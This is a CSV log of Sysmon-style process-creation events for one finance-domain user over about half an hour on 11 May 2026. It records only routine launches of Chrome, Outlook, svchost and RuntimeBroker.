UtcTime,EventID,Image,ParentImage,User,CommandLine,TargetImage,DestinationIp,QueryName
2026-05-11 08:58:06.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 08:58:30.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 08:59:00.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:59:35.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 08:59:56.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:00:08.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:00:17.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:00:26.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:00:42.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:00:45.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:01:18.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:01:58.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:02:26.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:02:46.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:03:02.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:03:15.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:03:44.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:04:13.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:04:32.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:05:06.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:05:36.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:06:09.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:06:25.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:06:35.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:06:49.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:07:08.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:07:11.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:07:46.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:08:17.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:08:22.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:08:43.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:09:14.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:09:42.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:10:20.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:10:55.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:11:30.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:11:56.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:12:06.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:12:11.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:12:32.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:12:59.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:13:32.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:14:02.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:14:06.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:14:27.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:14:36.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:15:07.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:15:44.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:15:47.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:15:57.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:16:07.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:16:46.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:17:06.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:17:45.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:18:07.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:18:44.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:19:18.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:19:38.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:20:14.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:20:40.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:21:20.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:21:25.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:21:50.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:22:22.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:23:00.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:23:12.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:23:43.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:24:05.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:24:37.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:24:58.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:25:25.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:25:39.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:25:58.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:26:37.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:27:09.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:27:42.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:28:05.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:28:39.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:28:57.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:29:34.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:30:07.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:30:14.000,1,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,FINANCE\\j.park,"svchost.exe -k netsvcs",,,
2026-05-11 09:30:42.000,1,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,FINANCE\\j.park,"OUTLOOK.EXE",,,
2026-05-11 09:31:06.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:31:19.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:31:43.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:31:49.000,1,C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,FINANCE\\j.park,"chrome.exe",,,
2026-05-11 09:31:52.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
2026-05-11 09:31:56.000,1,C:\Windows\System32\RuntimeBroker.exe,C:\Windows\System32\svchost.exe,FINANCE\\j.park,"RuntimeBroker.exe -Embedding",,,
